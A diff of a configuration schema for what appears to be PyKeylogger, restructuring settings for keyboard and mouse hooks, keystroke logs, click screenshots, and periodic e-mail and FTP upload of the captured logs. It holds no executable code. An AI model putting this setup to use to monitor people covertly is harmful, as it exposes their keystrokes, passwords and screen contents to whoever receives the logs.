@@ -14,6 +14,40 @@ Log Directory = string(max=64, default="logs")
 Hook Keyboard Tooltip = string()
 Hook Keyboard = boolean(default=True)
 
+# default: True
+Hook Mouse Tooltip = string()
+Hook Mouse = boolean(default=True)
+
+# default: Control_L;Control_R;F12
+Control Key Tooltip = string()
+Control Key = string(default="Control_L;Control_R;F12")
+
+# default: None
+System Log Tooltip = string()
+System Log = string(default=None)
+
+_Usage Time Flag Tooltip = string()
+_Usage Time Flag = string()
+
+[Detailed Log Writer]
+
+[[General]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="DetailedLogWriterFirstStage")
+
+# default: True
+Enable Detailed Log Writer Tooltip = string()
+Enable Detailed Log Writer = boolean(default=True)
+
+# default: detailedlog
+Log Subdirectory Tooltip = string()
+Log Subdirectory = string(max=64, default="detailed_log")
+
+# default: None
+Log Filename Tooltip = string()
+Log Filename = log_filename_check()
+
 # default: False
 Parse Backspace Tooltip = string()
 Parse Backspace = boolean(default=False)
@@ -22,17 +56,9 @@ Parse Backspace = boolean(default=False)
 Parse Escape Tooltip = string()
 Parse Escape = boolean(default=False)
 
-# default: F12
-Control Key Tooltip = string()
-Control Key = string(default="F11;F12")
-
 # default: None
 Applications Not Logged Tooltip = string()
 Applications Not Logged = string(default=None)
-
-# default: None
-Log File Tooltip = string()
-Log File = string(default="logfile.txt")
 
 # default: |
 Log File Field Separator Tooltip = string()
@@ -50,18 +76,15 @@ Limit Keylog Field Size = integer(min=0, default=0)
 Non-printing Character Representation Tooltip = string()
 Non-printing Character Representation = string(default="[KeyName:%keyname%]")
 
-# default: None
-System Log Tooltip = string()
-System Log = string(default=None)
 
-Usage Time Flag NoDisplay Tooltip = string()
-Usage Time Flag NoDisplay = string()
+[[E-mail]]
 
-[E-mail]
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="EmailLogSender")
 
 # default: False
-SMTP Send Email Tooltip = string()
-SMTP Send Email = boolean(default=False)
+Enable E-mail Tooltip = string()
+Enable E-mail = boolean(default=False)
 
 # default: True
 SMTP Needs Login Tooltip = string()
@@ -88,82 +111,271 @@ SMTP Use TLS Tooltip = string()
 SMTP Use TLS = boolean(default=True)
 
 # default: yourfromaddress@host.com
-SMTP From Tooltip = string()
-SMTP From = string(default="yourfromaddress@host.com")
+E-mail From Tooltip = string()
+E-mail From = string(default="yourfromaddress@host.com")
 
 # default: yourtoaddress@host.com
-SMTP To Tooltip = string()
-SMTP To = string(default="yourtoaddress@host.com")
+E-mail To Tooltip = string()
+E-mail To = string(default="yourtoaddress@host.com")
 
 # default: Automatic Logfile Email
-SMTP Subject Tooltip = string()
-SMTP Subject = string(default="Automatic Logfile Email")
+E-mail Subject Tooltip = string()
+E-mail Subject = string(default="Automatic Logfile Email")
 
 # default: "Please see attached zipfile."
-SMTP Message Body Tooltip = string()
-SMTP Message Body = string(default="Please see attached zipfile.")
+E-mail Message Body Tooltip = string()
+E-mail Message Body = string(default="Please see attached zipfile.")
 
 # default: 4.0
-Email Interval Tooltip = string()
-Email Interval = float(min=0.016, default=4.0)
+E-mail Interval Tooltip = string()
+E-mail Interval = float(min=0.016, default=4.0)
 
-[Zip]
+[[Zip]]
 
-##### disabled. filename set to log_[date].zip
-# Specify the filename for the zip archive that will be emailed to you
-# default: logzip.zip
-#zipArchiveNameTooltip=Specify the filename for the zip archive that will be emailed to you. "[date]" will be replaced with current date/time in MMDDYYYY_HHMMSS format. If "[date]" is not present, it will be added at the end of the filename, as it is needed for proper operation.
-#zipArchiveName=log_[date].zip
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="LogZipper")
 
 # default: False
-Zip Enable Tooltip = string()
-Zip Enable = boolean(default=False)
+Enable Zip Tooltip = string()
+Enable Zip = boolean(default=False)
 
 # default: 4.0
 Zip Interval Tooltip = string(default="Set this to the time interval between automatic zip events, in HOURS.")
 Zip Interval = float(min=0.016, default=4.0)
 
-#~ [FTP]
+[[FTP]]
 
-#~ # default: False
-#~ FTP Enable Tooltip = string(default="Set to True to enable automatic periodic uploading of a zipped archive of logfiles by FTP.")
-#~ FTP Enable = boolean(default=False)
-
-#~ # default: your.FTP.server
-#~ FTP Server Tooltip = string(default="Set to the hostname of your FTP server.")
-#~ FTP Server = string(default="your.FTP.server")
-
-#~ # default: 21
-#~ FTP Port Tooltip = string(default="Set to the port number of your FTP server (most FTP servers run on port 21).")
-#~ FTP Port = integer(min=1, max=65534, default=21)
-
-#~ # default: pykeylogger
-#~ FTP Upload Directory Tooltip = string(default="Set to the directory on the server where you would like to upload (relative or full path accepted).")
-#~ FTP Upload Directory = string(default="pykeylogger")
-
-#~ # default: anonymous
-#~ FTP Username Tooltip = string(default="Set to your username on the target FTP server.")
-#~ FTP Username = string(default="anonymous")
-
-#~ # For security purposes, this value can only be set through the control panel, to avoid storing your password in plain text.
-#~ # Setting it here directly will not work.
-#~ # default: anonymous@
-#~ FTP Password Tooltip = string(default="Set to your password on the target FTP server.")
-#~ FTP Password = string(default="anonymous@")
-
-#~ # default: True
-#~ FTP Passive Tooltip = string(default="Set to True to enable passive mode file transfer (recommended).")
-#~ FTP Passive = boolean(default=True)
-
-#~ # default: 4.0
-#~ FTP Interval Tooltip = string(default="Set this to the time interval between automatic FTP events, in HOURS.")
-#~ FTP Interval = float(min=0.016, default=4.0)
-
-[Log Maintenance]
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="FTPLogUploader")
 
 # default: False
-Delete Old Logs Tooltip = string(default="Set to True to enable automatic deletion of old logs.")
-Delete Old Logs = boolean(default=False)
+Enable FTP Tooltip = string()
+Enable FTP = boolean(default=False)
+
+# default: your.FTP.server
+FTP Server Tooltip = string()
+FTP Server = string(default="your.FTP.server")
+
+# default: 21
+FTP Port Tooltip = string()
+FTP Port = integer(min=1, max=65534, default=21)
+
+# default: anonymous
+FTP Username Tooltip = string()
+FTP Username = string(default="anonymous")
+
+# For security purposes, this value can only be set through the control panel, to avoid storing your password in plain text.
+# Setting it here directly will not work.
+# default: anonymous@
+FTP Password Tooltip = string()
+FTP Password = string()
+
+# default: pykeylogger
+FTP Upload Directory Tooltip = string()
+FTP Upload Directory = string(default="pykeylogger")
+
+# default: True
+FTP Passive Mode Tooltip = string()
+FTP Passive Mode = boolean(default=True)
+
+# default: 4.0
+FTP Interval Tooltip = string()
+FTP Interval = float(min=0.016, default=4.0)
+
+[[Old Log Deletion]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="OldLogDeleter")
+
+# default: False
+Enable Old Log Deletion Tooltip = string()
+Enable Old Log Deletion = boolean(default=False)
+
+# default: 2.0
+Max Log Age Tooltip = string()
+Max Log Age = float(min=0.00069, default=2.0)
+
+# default: 2.0
+Age Check Interval Tooltip = string()
+Age Check Interval = float(min=0.016, default=2.0)
+
+[[Log Flush]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="LogFlusher")
+
+# default: True
+Enable Log Flush Tooltip = string()
+Enable Log Flush = boolean(default=True)
+
+# default: 120
+Flush Interval Tooltip = string()
+Flush Interval = float(min=10, default=120.0)
+
+[[Log Rotation]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="LogRotator")
+
+# default: False
+Enable Log Rotation Tooltip = string()
+Enable Log Rotation = boolean(default=False)
+
+# default: 4.0
+Log Rotation Interval Tooltip = string()
+Log Rotation Interval = float(min=0.016, default=4.0)
+
+[Click Image Capture]
+
+[[General]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="OnClickImageCaptureFirstStage")
+
+# default: True
+Enable Click Image Capture Tooltip = string() 
+Enable Click Image Capture = boolean(default=True)
+
+# default: click_images
+Log Subdirectory Tooltip = string()
+Log Subdirectory = string(max=64, default="click_images")
+
+# default: logfile.txt
+Log Filename Tooltip = string()
+Log Filename = log_filename_check()
+
+Click Image Filename Tooltip = string()
+Click Image Filename = image_filename_check()
+
+# default: 150
+Click Image Width Tooltip = string()
+Click Image Width = integer(min=1, max=65534, default=150)
+
+# default: 150
+Click Image Height Tooltip = string()
+Click Image Height = integer(min=1, max=65534, default=150)
+
+# default: png
+Click Image Format Tooltip = string()
+Click Image Format = string(min=3, max=3, default="png")
+
+# default: 75
+Click Image Quality Tooltip = string()
+Click Image Quality = integer(min=1, max=100, default=75)
+
+[[E-mail]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="EmailLogSender")
+
+# default: False
+Enable E-mail Tooltip = string()
+Enable E-mail = boolean(default=False)
+
+# default: True
+SMTP Needs Login Tooltip = string()
+SMTP Needs Login = boolean(default=True)
+
+# default: yourusername
+SMTP Username Tooltip = string()
+SMTP Username = string(default="yourusername")
+
+# default: "" (Blank password)
+SMTP Password Tooltip = string()
+SMTP Password = string(default="")
+
+# default: smtp.gmail.com
+SMTP Server Tooltip = string()
+SMTP Server = string(default="smtp.gmail.com")
+
+# default: 587
+SMTP Port Tooltip = string()
+SMTP Port = integer(min=1, max=65534, default=587)
+
+# default: True
+SMTP Use TLS Tooltip = string()
+SMTP Use TLS = boolean(default=True)
+
+# default: yourfromaddress@host.com
+E-mail From Tooltip = string()
+E-mail From = string(default="yourfromaddress@host.com")
+
+# default: yourtoaddress@host.com
+E-mail To Tooltip = string()
+E-mail To = string(default="yourtoaddress@host.com")
+
+# default: Automatic Logfile Email
+E-mail Subject Tooltip = string()
+E-mail Subject = string(default="Automatic Logfile Email")
+
+# default: "Please see attached zipfile."
+E-mail Message Body Tooltip = string()
+E-mail Message Body = string(default="Please see attached zipfile.")
+
+# default: 4.0
+E-mail Interval Tooltip = string()
+E-mail Interval = float(min=0.016, default=4.0)
+
+[[Zip]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="LogZipper")
+
+# default: False
+Enable Zip Tooltip = string()
+Enable Zip = boolean(default=False)
+
+# default: 4.0
+Zip Interval Tooltip = string(default="Set this to the time interval between automatic zip events, in HOURS.")
+Zip Interval = float(min=0.016, default=4.0)
+
+[[FTP]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="FTPLogUploader")
+
+# default: False
+Enable FTP Tooltip = string()
+Enable FTP = boolean(default=False)
+
+# default: your.FTP.server
+FTP Server Tooltip = string()
+FTP Server = string(default="your.FTP.server")
+
+# default: 21
+FTP Port Tooltip = string()
+FTP Port = integer(min=1, max=65534, default=21)
+
+# default: anonymous
+FTP Username Tooltip = string()
+FTP Username = string(default="anonymous")
+
+# For security purposes, this value can only be set through the control panel, to avoid storing your password in plain text.
+# Setting it here directly will not work.
+# default: anonymous@
+FTP Password Tooltip = string()
+FTP Password = string()
+
+# default: pykeylogger
+FTP Upload Directory Tooltip = string()
+FTP Upload Directory = string(default="pykeylogger")
+
+# default: True
+FTP Passive Mode Tooltip = string()
+FTP Passive Mode = boolean(default=True)
+
+# default: 4.0
+FTP Interval Tooltip = string()
+FTP Interval = float(min=0.016, default=4.0)
+
+[[Old Log Deletion]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="OldLogDeleter")
+
+# default: False
+Enable Old Log Deletion Tooltip = string()
+Enable Old Log Deletion = boolean(default=False)
 
 # default: 2.0
 Max Log Age Tooltip = string(default="Set to the maximum age of the logs that you want to keep, in days. Logs older than this will be deleted.")
@@ -173,32 +385,28 @@ Max Log Age = float(min=0.00069, default=2.0)
 Age Check Interval Tooltip = string(default="Set to the frequency of checking for and deleting logs older than maxLogAge, in HOURS.")
 Age Check Interval = float(min=0.016, default=2.0)
 
+[[Log Flush]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="LogFlusher")
+
+# default: True
+Enable Log Flush Tooltip = string()
+Enable Log Flush = boolean(default=True)
+
 # default: 120
 Flush Interval Tooltip = string()
 Flush Interval = float(min=10, default=120.0)
 
+[[Log Rotation]]
+
+# Name of class to instantiate to create this thread. Internal use only.
+_Thread_Class = string(default="LogRotator")
+
+# default: False
+Enable Log Rotation Tooltip = string()
+Enable Log Rotation = boolean(default=False)
+
 # default: 4.0
 Log Rotation Interval Tooltip = string()
 Log Rotation Interval = float(min=0.016, default=4.0)
-
-[Image Capture]
-
-# default: True
-Capture Clicks Tooltip = string()
-Capture Clicks = boolean(default=True)
-
-# default: 150
-Capture Clicks Width Tooltip = string()
-Capture Clicks Width = integer(min=1, max=65534, default=150)
-
-# default: 150
-Capture Clicks Height Tooltip = string()
-Capture Clicks Height = integer(min=1, max=65534, default=150)
-
-# default: png
-Capture Clicks Image Format Tooltip = string()
-Capture Clicks Image Format = string(min=3, max=3, default="png")
-
-# default: 75
-Capture Clicks Image Quality Tooltip = string()
-Capture Clicks Image Quality = integer(min=1, max=75, default=75)
